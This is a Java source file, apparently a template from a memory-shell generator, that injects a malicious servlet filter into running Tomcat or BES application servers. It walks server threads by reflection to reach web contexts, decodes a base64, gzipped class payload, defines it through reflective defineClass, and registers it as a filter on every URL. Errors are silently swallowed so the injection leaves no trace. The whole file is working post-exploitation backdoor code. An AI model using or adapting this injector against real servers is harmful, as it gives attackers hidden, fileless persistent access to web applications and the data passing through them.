package jmg.core.template;

import java.io.*;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.zip.GZIPInputStream;


public class BESFilterInjectorTpl {

    public String getUrlPattern() {
        return "/*";
    }


    public String getClassName() {
        return "";
    }

    public String getBase64String() throws IOException {
        return "";
    }

    static {
        new BESFilterInjectorTpl();
    }

    public BESFilterInjectorTpl() {
        try {
            List<Object> contexts = getContext();
            for (Object context : contexts) {
                Object filter = getFilter(context);
                addFilter(context, filter);
            }
        } catch (Exception ignored) {

        }


    }

    public List<Object> getContext() throws IllegalAccessException, NoSuchMethodException, InvocationTargetException {
        List<Object> contexts = new ArrayList();
        Thread[] threads = getThreads();
        try {
            for (Thread thread : threads) {
                if (thread.getName().contains("ContainerBackgroundProcessor")) {
                    HashMap childrenMap = (HashMap) getFV(getFV(getFV(thread, "target"), "this$0"), "children");
                    for (Object key : childrenMap.keySet()) {
                        HashMap children = (HashMap) getFV(childrenMap.get(key), "children");
                        for (Object key1 : children.keySet()) {
                            Object context = children.get(key1);
                            if (context != null) contexts.add(context);
                        }
                    }
                }
            }
        } catch (Exception ignored) {

        }
        return contexts;
    }

    public Thread[] getThreads() {
        Thread[] var0 = null;

        try {
            var0 = (Thread[]) (invokeMethod(Thread.class, "getThreads"));
        } catch (NoSuchMethodException | InvocationTargetException | IllegalAccessException var3) {
            ThreadGroup var2 = Thread.currentThread().getThreadGroup();
            var0 = new Thread[var2.activeCount()];
            var2.enumerate(var0);
        }

        return var0;
    }

    private ClassLoader getWebAppClassLoader(Object context) throws Exception {
        try {
            return ((ClassLoader) invokeMethod(context, "getClassLoader", null, null));
        } catch (Exception e) {
            Object loader = invokeMethod(context, "getLoader", null, null);
            return ((ClassLoader) invokeMethod(loader, "getClassLoader", null, null));
        }
    }

    private Object getFilter(Object context) throws Exception {
        Object filter = null;
        ClassLoader classLoader = getWebAppClassLoader(context);
        try {
            filter = classLoader.loadClass(getClassName()).newInstance();
        } catch (Exception e1) {
            try {
                byte[] clazzByte = gzipDecompress(decodeBase64(getBase64String()));
                Method defineClass = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
                defineClass.setAccessible(true);
                Class clazz = (Class) defineClass.invoke(classLoader, clazzByte, 0, clazzByte.length);
                filter = clazz.newInstance();
            } catch (Exception ignored) {

            }

        }
        return filter;
    }

    public void addFilter(Object context, Object filter) throws Exception {
        String filterName = filter.getClass().getSimpleName();
        if (isInjected(context, filterName)) {
            return;
        }
        try {
            Object filterDef;
            Object filterMap;
            try {
                filterDef = Class.forName("org.apache.tomcat.util.descriptor.web.FilterDef").newInstance();
                filterMap = Class.forName("org.apache.tomcat.util.descriptor.web.FilterMap").newInstance();
            } catch (Exception e2) {
                try {
                    filterDef = Class.forName("com.bes.enterprise.util.descriptor.web.FilterDef").newInstance();
                    filterMap = Class.forName("com.bes.enterprise.util.descriptor.web.FilterMap").newInstance();
                } catch (Exception e3) {
                    filterDef = Class.forName("com.bes.enterprise.web.util.descriptor.web.FilterDef").newInstance();
                    filterMap = Class.forName("com.bes.enterprise.web.util.descriptor.web.FilterMap").newInstance();
                }
            }
            invokeMethod(filterDef, "setFilterName", new Class[]{String.class}, new Object[]{filterName});
            invokeMethod(filterDef, "setFilterClass", new Class[]{String.class}, new Object[]{getClassName()});
            invokeMethod(context, "addFilterDef", new Class[]{filterDef.getClass()}, new Object[]{filterDef});
            invokeMethod(filterMap, "setFilterName", new Class[]{String.class}, new Object[]{filterName});
            invokeMethod(filterMap, "setDispatcher", new Class[]{String.class}, new Object[]{"REQUEST"});
            invokeMethod(filterMap, "addURLPattern", new Class[]{String.class}, new Object[]{getUrlPattern()});
            Constructor<?>[] constructors;
            try {
                constructors = Class.forName("org.apache.catalina.core.ApplicationFilterConfig").getDeclaredConstructors();
            } catch (Exception e) {
                constructors = Class.forName("com.bes.enterprise.webtier.core.ApplicationFilterConfig").getDeclaredConstructors();
            }
            try {
                invokeMethod(context, "addFilterMapBefore", new Class[]{filterMap.getClass()}, new Object[]{filterMap});
            } catch (Exception e) {
                invokeMethod(context, "addFilterMap", new Class[]{filterMap.getClass()}, new Object[]{filterMap});
            }
            constructors[0].setAccessible(true);
            Object filterConfig = constructors[0].newInstance(context, filterDef);
            Map filterConfigs = (Map) getFV(context, "filterConfigs");
            filterConfigs.put(filterName, filterConfig);

        } catch (Exception ignored) {

        }
    }


    public boolean isInjected(Object context, String filterName) throws Exception {
        Map filterConfigs = (Map) getFV(context, "filterConfigs");
        for (Object key : filterConfigs.keySet()) {
            if (key.toString().contains(filterName)) {
                return true;
            }
        }
        return false;
    }

    static byte[] decodeBase64(String base64Str) throws ClassNotFoundException, NoSuchMethodException, InvocationTargetException, IllegalAccessException {
        Class<?> decoderClass;
        try {
            decoderClass = Class.forName("sun.misc.BASE64Decoder");
            return (byte[]) decoderClass.getMethod("decodeBuffer", String.class).invoke(decoderClass.newInstance(), base64Str);
        } catch (Exception ignored) {
            decoderClass = Class.forName("java.util.Base64");
            Object decoder = decoderClass.getMethod("getDecoder").invoke(null);
            return (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, base64Str);
        }
    }

    public static byte[] gzipDecompress(byte[] compressedData) throws IOException {
        ByteArrayOutputStream out = new ByteArrayOutputStream();
        ByteArrayInputStream in = new ByteArrayInputStream(compressedData);
        GZIPInputStream ungzip = new GZIPInputStream(in);
        byte[] buffer = new byte[256];
        int n;
        while ((n = ungzip.read(buffer)) >= 0) {
            out.write(buffer, 0, n);
        }
        return out.toByteArray();
    }

    synchronized void setFV(Object var0, String var1, Object val) throws Exception {
        getF(var0, var1).set(var0, val);
    }

    static Object getFV(Object obj, String fieldName) throws Exception {
        Field field = getF(obj, fieldName);
        field.setAccessible(true);
        return field.get(obj);
    }

    static Field getF(Object obj, String fieldName) throws NoSuchFieldException {
        Class<?> clazz = obj.getClass();
        while (clazz != null) {
            try {
                Field field = clazz.getDeclaredField(fieldName);
                field.setAccessible(true);
                return field;
            } catch (NoSuchFieldException e) {
                clazz = clazz.getSuperclass();
            }
        }
        throw new NoSuchFieldException(fieldName);
    }

    static synchronized Object invokeMethod(Object targetObject, String methodName) throws NoSuchMethodException, IllegalAccessException, InvocationTargetException {
        return invokeMethod(targetObject, methodName, new Class[0], new Object[0]);
    }

    public static synchronized Object invokeMethod(final Object obj, final String methodName, Class[] paramClazz, Object[] param) throws NoSuchMethodException, InvocationTargetException, IllegalAccessException {
        Class clazz = (obj instanceof Class) ? (Class) obj : obj.getClass();
        Method method = null;

        Class tempClass = clazz;
        while (method == null && tempClass != null) {
            try {
                if (paramClazz == null) {
                    // Get all declared methods of the class
                    Method[] methods = tempClass.getDeclaredMethods();
                    for (int i = 0; i < methods.length; i++) {
                        if (methods[i].getName().equals(methodName) && methods[i].getParameterTypes().length == 0) {
                            method = methods[i];
                            break;
                        }
                    }
                } else {
                    method = tempClass.getDeclaredMethod(methodName, paramClazz);
                }
            } catch (NoSuchMethodException e) {
                tempClass = tempClass.getSuperclass();
            }
        }
        if (method == null) {
            throw new NoSuchMethodException(methodName);
        }
        method.setAccessible(true);
        if (obj instanceof Class) {
            try {
                return method.invoke(null, param);
            } catch (IllegalAccessException e) {
                throw new RuntimeException(e.getMessage());
            }
        } else {
            try {
                return method.invoke(obj, param);
            } catch (IllegalAccessException e) {
                throw new RuntimeException(e.getMessage());
            }
        }
    }
}
